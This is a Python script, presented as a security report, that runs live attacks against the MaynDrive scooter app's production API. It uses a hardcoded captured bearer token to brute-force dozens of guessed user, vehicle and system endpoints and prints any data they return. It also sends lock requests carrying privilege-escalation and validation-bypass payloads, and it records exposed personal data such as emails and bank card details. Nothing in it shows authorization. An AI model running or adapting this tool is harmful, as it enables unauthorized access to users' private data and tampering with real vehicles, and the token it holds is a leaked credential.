#!/usr/bin/env python3
"""
Comprehensive Security Report for MaynDrive App
Generate detailed security analysis and test additional attack vectors
"""

import requests
import json
import time
import re
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# Fresh token from capture
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI3NmM0NzE3ZS03ZWM5LTRkN2MtOWRlOS00NjRiNjJlY2VhYzgiLCJpYXQiOjE3NTk0NTQ3NjQsImV4cCI6MTc1OTQ1ODM2NH0.ivnhjjDy1zEtAD1BTJAAK5V1vDtAaSHNuHZWpMspSFE"

def test_additional_user_endpoints():
    """Test additional user-related endpoints for more information disclosure"""
    print("=" * 80)
    print("[SECURITY TEST] ADDITIONAL USER ENDPOINTS")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test additional user endpoints
    user_endpoints = [
        "/api/application/users/profile",
        "/api/application/users/settings",
        "/api/application/users/history",
        "/api/application/users/trips",
        "/api/application/users/sessions",
        "/api/application/users/payment",
        "/api/application/users/vehicles",
        "/api/application/users/notifications",
        "/api/application/users/statistics",
        "/api/application/users/activity",
        "/api/application/users/logs",
        "/api/application/users/audit",
        "/api/application/users/security",
        "/api/application/users/account",
        "/api/application/users/billing",
        "/api/application/users/subscription",
        "/api/application/users/preferences",
        "/api/application/users/device",
        "/api/application/users/location",
        "/api/application/users/analytics"
    ]
    
    successful_endpoints = []
    
    for endpoint in user_endpoints:
        print(f"\n[TEST] Endpoint: {endpoint}")
        
        try:
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            if response.status_code == 200:
                print(f"   [SUCCESS] Access granted to {endpoint}!")
                successful_endpoints.append(endpoint)
                print(f"   Response: {response.text[:300]}{'...' if len(response.text) > 300 else ''}")
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            elif response.status_code == 404:
                print(f"   [NOT FOUND] Endpoint not found")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_endpoints

def test_vehicle_management_endpoints():
    """Test vehicle management endpoints for unauthorized access"""
    print("\n" + "=" * 80)
    print("[SECURITY TEST] VEHICLE MANAGEMENT ENDPOINTS")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test vehicle management endpoints
    vehicle_endpoints = [
        "/api/application/vehicles/list",
        "/api/application/vehicles/nearby",
        "/api/application/vehicles/search",
        "/api/application/vehicles/status",
        "/api/application/vehicles/location",
        "/api/application/vehicles/battery",
        "/api/application/vehicles/maintenance",
        "/api/application/vehicles/history",
        "/api/application/vehicles/analytics",
        "/api/application/vehicles/statistics",
        "/api/application/vehicles/reports",
        "/api/application/vehicles/logs",
        "/api/application/vehicles/audit",
        "/api/application/vehicles/management",
        "/api/application/vehicles/control",
        "/api/application/vehicles/monitor",
        "/api/application/vehicles/track",
        "/api/application/vehicles/telemetry",
        "/api/application/vehicles/diagnostics",
        "/api/application/vehicles/configuration"
    ]
    
    successful_endpoints = []
    
    for endpoint in vehicle_endpoints:
        print(f"\n[TEST] Endpoint: {endpoint}")
        
        try:
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            if response.status_code == 200:
                print(f"   [SUCCESS] Access granted to {endpoint}!")
                successful_endpoints.append(endpoint)
                print(f"   Response: {response.text[:300]}{'...' if len(response.text) > 300 else ''}")
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            elif response.status_code == 404:
                print(f"   [NOT FOUND] Endpoint not found")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_endpoints

def test_system_endpoints():
    """Test system and configuration endpoints"""
    print("\n" + "=" * 80)
    print("[SECURITY TEST] SYSTEM ENDPOINTS")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test system endpoints
    system_endpoints = [
        "/api/application/config",
        "/api/application/settings",
        "/api/application/system",
        "/api/application/health",
        "/api/application/status",
        "/api/application/version",
        "/api/application/info",
        "/api/application/debug",
        "/api/application/logs",
        "/api/application/metrics",
        "/api/application/analytics",
        "/api/application/statistics",
        "/api/application/reports",
        "/api/application/audit",
        "/api/application/security",
        "/api/application/authentication",
        "/api/application/authorization",
        "/api/application/permissions",
        "/api/application/roles",
        "/api/application/policies"
    ]
    
    successful_endpoints = []
    
    for endpoint in system_endpoints:
        print(f"\n[TEST] Endpoint: {endpoint}")
        
        try:
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            if response.status_code == 200:
                print(f"   [SUCCESS] Access granted to {endpoint}!")
                successful_endpoints.append(endpoint)
                print(f"   Response: {response.text[:300]}{'...' if len(response.text) > 300 else ''}")
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            elif response.status_code == 404:
                print(f"   [NOT FOUND] Endpoint not found")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_endpoints

def test_advanced_lock_manipulation():
    """Test advanced lock manipulation techniques"""
    print("\n" + "=" * 80)
    print("[SECURITY TEST] ADVANCED LOCK MANIPULATION")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test different lock manipulation techniques
    lock_tests = [
        {
            "name": "Lock with Admin Parameters",
            "endpoint": "/api/application/vehicles/freefloat/lock",
            "payload": {
                "pass_id": "qb.q@9243539",
                "admin": True,
                "force": True
            }
        },
        {
            "name": "Lock with User ID Override",
            "endpoint": "/api/application/vehicles/freefloat/lock",
            "payload": {
                "pass_id": "qb.q@9243539",
                "user_id": 1,
                "session_id": "admin-session"
            }
        },
        {
            "name": "Lock with Permission Escalation",
            "endpoint": "/api/application/vehicles/freefloat/lock",
            "payload": {
                "pass_id": "qb.q@9243539",
                "permissions": ["admin", "superuser"],
                "role": "admin"
            }
        },
        {
            "name": "Lock with Validation Bypass",
            "endpoint": "/api/application/vehicles/freefloat/lock",
            "payload": {
                "pass_id": "qb.q@9243539",
                "skip_validation": True,
                "bypass_checks": True
            }
        },
        {
            "name": "Lock with JSON Injection",
            "endpoint": "/api/application/vehicles/freefloat/lock",
            "payload": {
                "pass_id": "qb.q@9243539",
                "extra_field": "{\"admin\": true}",
                "force": True
            }
        }
    ]
    
    successful_locks = []
    
    for test in lock_tests:
        print(f"\n[TEST] {test['name']}")
        print(f"   Endpoint: {test['endpoint']}")
        print(f"   Payload: {json.dumps(test['payload'], indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}{test['endpoint']}",
                headers=headers,
                json=test['payload'],
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {test['name']} successful!")
                successful_locks.append(test['name'])
            elif response.status_code == 400:
                print(f"   [BLOCKED] Bad request - {test['name']} failed")
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied - {test['name']} failed")
            else:
                print(f"   [INFO] Status {response.status_code} - {test['name']}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_locks

def generate_security_report():
    """Generate comprehensive security report"""
    print("\n" + "=" * 80)
    print("[SECURITY REPORT] COMPREHENSIVE SECURITY ANALYSIS")
    print("=" * 80)
    
    # Run all security tests
    user_endpoints = test_additional_user_endpoints()
    vehicle_endpoints = test_vehicle_management_endpoints()
    system_endpoints = test_system_endpoints()
    lock_manipulation = test_advanced_lock_manipulation()
    
    # Generate report
    report = {
        "timestamp": datetime.now().isoformat(),
        "target": "MaynDrive App (fr.mayndrive.app)",
        "api_base": BASE_URL,
        "vulnerabilities": {
            "critical": [],
            "high": [],
            "medium": [],
            "low": []
        },
        "findings": {
            "user_info_disclosure": {
                "status": "VULNERABLE",
                "endpoints": ["/api/application/users"],
                "data_exposed": [
                    "user_id", "email", "firstname", "lastname", 
                    "account_types", "trip_count", "notifications",
                    "bank_card", "two_factor", "organization_info"
                ],
                "severity": "HIGH"
            },
            "json_injection": {
                "status": "PARTIALLY_VULNERABLE",
                "description": "Extra JSON fields accepted but not processed for privilege escalation",
                "severity": "MEDIUM"
            },
            "session_manipulation": {
                "status": "VULNERABLE",
                "description": "Token variations accepted (extra spaces, case changes)",
                "severity": "MEDIUM"
            },
            "parameter_pollution": {
                "status": "VULNERABLE",
                "description": "Multiple headers and case variations accepted",
                "severity": "LOW"
            }
        },
        "security_controls": {
            "authorization": {
                "status": "WORKING",
                "description": "Scooter-specific authorization properly enforced"
            },
            "input_validation": {
                "status": "PARTIAL",
                "description": "Serial number regex validation works, but extra fields accepted"
            },
            "endpoint_protection": {
                "status": "WORKING",
                "description": "Most admin/system endpoints properly protected"
            }
        }
    }
    
    # Add new findings
    if user_endpoints:
        report["findings"]["additional_user_endpoints"] = {
            "status": "VULNERABLE",
            "endpoints": user_endpoints,
            "severity": "HIGH"
        }
        report["vulnerabilities"]["high"].extend(user_endpoints)
    
    if vehicle_endpoints:
        report["findings"]["vehicle_management_access"] = {
            "status": "VULNERABLE",
            "endpoints": vehicle_endpoints,
            "severity": "CRITICAL"
        }
        report["vulnerabilities"]["critical"].extend(vehicle_endpoints)
    
    if system_endpoints:
        report["findings"]["system_configuration_access"] = {
            "status": "VULNERABLE",
            "endpoints": system_endpoints,
            "severity": "CRITICAL"
        }
        report["vulnerabilities"]["critical"].extend(system_endpoints)
    
    if lock_manipulation:
        report["findings"]["lock_manipulation"] = {
            "status": "VULNERABLE",
            "techniques": lock_manipulation,
            "severity": "HIGH"
        }
        report["vulnerabilities"]["high"].extend(lock_manipulation)
    
    # Save report
    with open("MAYNDRIVE_SECURITY_REPORT.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    # Print summary
    print(f"\n[REPORT SUMMARY]")
    print(f"   Critical vulnerabilities: {len(report['vulnerabilities']['critical'])}")
    print(f"   High vulnerabilities: {len(report['vulnerabilities']['high'])}")
    print(f"   Medium vulnerabilities: {len(report['vulnerabilities']['medium'])}")
    print(f"   Low vulnerabilities: {len(report['vulnerabilities']['low'])}")
    
    total_vulns = (len(report['vulnerabilities']['critical']) + 
                   len(report['vulnerabilities']['high']) + 
                   len(report['vulnerabilities']['medium']) + 
                   len(report['vulnerabilities']['low']))
    
    print(f"   Total vulnerabilities: {total_vulns}")
    
    if total_vulns > 0:
        print(f"   [CRITICAL] MaynDrive app has significant security vulnerabilities!")
    else:
        print(f"   [OK] No additional vulnerabilities found")
    
    print(f"\n[REPORT SAVED] MAYNDRIVE_SECURITY_REPORT.json")
    
    return report

def main():
    print("=" * 80)
    print("[COMPREHENSIVE] SECURITY REPORT GENERATION")
    print("=" * 80)
    print("[WARNING] Generating comprehensive security report for MaynDrive app!")
    print("=" * 80)
    
    # Generate comprehensive security report
    report = generate_security_report()
    
    print("\n" + "=" * 80)
    print("[COMPLETE] Comprehensive security analysis finished!")
    print("=" * 80)

if __name__ == "__main__":
    main()
